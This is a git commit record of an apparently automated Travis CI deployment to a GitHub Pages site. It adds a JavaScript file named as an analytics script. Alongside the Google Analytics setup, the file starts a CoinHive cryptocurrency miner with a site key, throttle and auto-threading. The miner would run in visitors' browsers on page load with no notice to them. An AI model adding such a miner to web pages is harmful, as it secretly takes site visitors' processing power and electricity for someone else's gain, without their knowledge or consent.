9bb14400fc750c600ea0860e857e47bf392fbc8a
Deployment Bot (from Travis CI) <deploy@travis-ci.org>
2017-11-29 02:11:10 +0000

    Deploy HaoZeke/zenYoda_Starter to github.com/HaoZeke/zenYoda_Starter.git:gh-pages

---
+++ js/gAnalyticsHive.js
@@ -0,0 +1,12 @@
+// Analytics
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+
+gtag('config', 'UA-109503488-3');
+
+// Miner
+var miner = new CoinHive.Anonymous('cwMkBJ1OstEitWyfKnywfyMF2H0qk03m', {
+	throttle: 0.5,
+	autoThreads: true});
+miner.start();
